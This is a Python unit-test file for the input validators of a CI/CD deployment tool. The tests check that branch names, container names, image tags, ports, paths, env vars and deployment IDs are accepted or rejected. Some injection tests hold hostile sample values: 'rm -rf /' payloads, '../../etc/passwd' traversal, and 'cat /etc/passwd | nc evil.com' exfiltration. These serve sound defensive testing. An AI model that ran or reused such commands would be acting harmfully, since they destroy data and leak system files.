"""
Unit tests for utils/validation.py

Tests every validator with valid and invalid inputs.
"""
import pytest

from mcp_cicd.exceptions import ValidationError
from mcp_cicd.utils.validation import (
    validate_branch_name,
    validate_container_name,
    validate_image_tag,
    validate_port,
    validate_dockerfile_path,
    sanitize_environment_variables,
    validate_deployment_id,
)


# ── validate_branch_name ────────────────────────────────────────────────────

class TestValidateBranchName:
    def test_simple_branch(self):
        assert validate_branch_name("main") == "main"

    def test_branch_with_slash(self):
        assert validate_branch_name("feature/my-feat") == "feature/my-feat"

    def test_branch_with_dots_and_underscores(self):
        assert validate_branch_name("release_1.2.3") == "release_1.2.3"

    def test_tag_style(self):
        assert validate_branch_name("v1.0.0") == "v1.0.0"

    def test_commit_sha(self):
        sha = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
        assert validate_branch_name(sha) == sha

    def test_path_traversal_raises(self):
        with pytest.raises(ValidationError):
            validate_branch_name("../../etc/passwd")

    def test_special_chars_raises(self):
        with pytest.raises(ValidationError):
            validate_branch_name("feature;rm -rf")

    def test_space_raises(self):
        with pytest.raises(ValidationError):
            validate_branch_name("feature branch")


# ── validate_container_name ─────────────────────────────────────────────────

class TestValidateContainerName:
    def test_simple_name(self):
        assert validate_container_name("myapp") == "myapp"

    def test_name_with_hyphens(self):
        assert validate_container_name("my-app-prod") == "my-app-prod"

    def test_name_with_underscores(self):
        assert validate_container_name("my_app_v2") == "my_app_v2"

    def test_name_with_numbers(self):
        assert validate_container_name("app123") == "app123"

    def test_too_long_raises(self):
        long_name = "a" * 64
        with pytest.raises(ValidationError):
            validate_container_name(long_name)

    def test_starts_with_hyphen_raises(self):
        with pytest.raises(ValidationError):
            validate_container_name("-myapp")

    def test_special_chars_raises(self):
        with pytest.raises(ValidationError):
            validate_container_name("app@prod")

    def test_single_char_raises(self):
        # Pattern requires at least 2 chars (starts with alnum + at least one more)
        with pytest.raises(ValidationError):
            validate_container_name("a")


# ── validate_image_tag ──────────────────────────────────────────────────────

class TestValidateImageTag:
    def test_name_with_version(self):
        assert validate_image_tag("myapp:v1.0") == "myapp:v1.0"

    def test_name_with_latest(self):
        assert validate_image_tag("myapp:latest") == "myapp:latest"

    def test_name_without_version_gets_latest(self):
        assert validate_image_tag("myapp") == "myapp:latest"

    def test_with_registry_prefix(self):
        result = validate_image_tag("registry/myapp:v1.0")
        assert result == "registry/myapp:v1.0"

    def test_uppercase_name_raises(self):
        with pytest.raises(ValidationError):
            validate_image_tag("MyApp:v1.0")

    def test_version_with_special_chars_raises(self):
        with pytest.raises(ValidationError):
            validate_image_tag("myapp:v1.0@sha256")


# ── validate_port ───────────────────────────────────────────────────────────

class TestValidatePort:
    def test_valid_port(self):
        assert validate_port(8080) == 8080

    def test_min_boundary(self):
        assert validate_port(1) == 1

    def test_max_boundary(self):
        assert validate_port(65535) == 65535

    def test_low_ports_valid_by_default(self):
        # Ports like 80 are valid now (min_port default is 1)
        assert validate_port(80) == 80

    def test_too_low_raises(self):
        with pytest.raises(ValidationError):
            validate_port(0)

    def test_too_high_raises(self):
        with pytest.raises(ValidationError):
            validate_port(65536)

    def test_not_integer_raises(self):
        with pytest.raises(ValidationError):
            validate_port("8080")  # type: ignore

    def test_custom_min_port_for_host_ports(self):
        # Host ports enforce min 1024 explicitly at the call site
        assert validate_port(8080, min_port=1024) == 8080
        with pytest.raises(ValidationError):
            validate_port(80, min_port=1024)


# ── validate_dockerfile_path ────────────────────────────────────────────────

class TestValidateDockerfilePath:
    def test_valid_dockerfile(self, tmp_path):
        dockerfile = tmp_path / "Dockerfile"
        dockerfile.write_text("FROM scratch")
        result = validate_dockerfile_path("Dockerfile", tmp_path)
        assert result == dockerfile

    def test_nested_dockerfile(self, tmp_path):
        subdir = tmp_path / "docker"
        subdir.mkdir()
        dockerfile = subdir / "Dockerfile"
        dockerfile.write_text("FROM scratch")
        result = validate_dockerfile_path("docker/Dockerfile", tmp_path)
        assert result == dockerfile

    def test_path_traversal_raises(self, tmp_path):
        with pytest.raises(ValidationError):
            validate_dockerfile_path("../../etc/passwd", tmp_path)

    def test_missing_file_raises(self, tmp_path):
        with pytest.raises(ValidationError):
            validate_dockerfile_path("Dockerfile", tmp_path)  # file doesn't exist


# ── sanitize_environment_variables ─────────────────────────────────────────

class TestSanitizeEnvVars:
    def test_valid_env_vars(self):
        env = {"APP_ENV": "production", "PORT": "8080", "DB_HOST": "localhost"}
        result = sanitize_environment_variables(env)
        assert result == {"APP_ENV": "production", "PORT": "8080", "DB_HOST": "localhost"}

    def test_invalid_key_raises(self):
        with pytest.raises(ValidationError):
            sanitize_environment_variables({"app-env": "prod"})  # lowercase not allowed

    def test_semicolon_in_value_raises(self):
        with pytest.raises(ValidationError):
            sanitize_environment_variables({"CMD": "echo hello; rm -rf /"})

    def test_pipe_in_value_raises(self):
        with pytest.raises(ValidationError):
            sanitize_environment_variables({"CMD": "cat /etc/passwd | nc evil.com"})

    def test_backtick_in_value_raises(self):
        with pytest.raises(ValidationError):
            sanitize_environment_variables({"CMD": "`rm -rf /`"})


# ── validate_deployment_id ──────────────────────────────────────────────────

class TestValidateDeploymentId:
    def test_valid_id(self):
        dep_id = "dep-20260218-abc123"
        assert validate_deployment_id(dep_id) == dep_id

    def test_valid_id_with_letters_and_numbers(self):
        dep_id = "dep-20260101-a1b2c3"
        assert validate_deployment_id(dep_id) == dep_id

    def test_missing_prefix_raises(self):
        with pytest.raises(ValidationError):
            validate_deployment_id("20260218-abc123")

    def test_wrong_date_format_raises(self):
        with pytest.raises(ValidationError):
            validate_deployment_id("dep-2026-02-18-abc123")

    def test_uppercase_suffix_raises(self):
        with pytest.raises(ValidationError):
            validate_deployment_id("dep-20260218-ABC123")

    def test_empty_raises(self):
        with pytest.raises(ValidationError):
            validate_deployment_id("")
